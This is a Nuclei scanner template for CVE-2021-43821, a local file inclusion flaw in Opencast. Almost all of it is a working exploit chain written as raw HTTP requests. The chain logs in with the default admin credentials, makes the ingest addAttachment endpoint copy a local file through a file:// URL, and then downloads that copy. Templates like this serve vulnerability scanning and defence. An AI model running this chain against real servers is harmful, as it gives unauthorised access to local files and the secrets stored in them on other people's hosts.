id: CVE-2021-43821

info:
  name: Opencast addAttachment Local File Inclusion
  author: ProjectDiscoveryAI
  severity: high
  description: |
    Opencast has a local file inclusion vulnerability allowing attackers to include most local files the process has permission to read, extracting secrets from the host.
  tags: file-inclusion
  reference:
    - https://mp.weixin.qq.com/s/fjna3mHraPmEy1b1wnEYrQ

flow: |
  http(1) && http(2) && http(3)

variables:
  cookie: ''
  path: ''

http:
  - id: login
    raw:
      - |
        POST /admin-ng/j_spring_security_check HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Cookie: fresh=START

        j_username=admin&j_password=opencast
    extractors:
      - type: regex
        name: cookie
        group: 1
        regex:
          - "JSESSIONID=.*;"
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "JSESSIONID="
          - "/admin-ng/index.html"

  - id: add-attachment
    raw:
      - |
        POST /ingest/addAttachment HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cookie}}

        url=file:///etc/bash.bashrc&flavor=1/2&mediaPackage=<test></test>
    extractors:
      - type: regex
        name: path
        group: 1
        regex:
          - "/files/mediapackage/.+?/bash.bashrc</url>"
        internal: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "/bash.bashrc"
          - "type=\"1/2\"><tags/><url>"

  - id: fetch-file
    raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Cookie: {{cookie}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "# System-wide .bashrc file for interactive bash(1) shells."
      - type: word
        part: header
        words:
          - "filename=bash.bashrc"
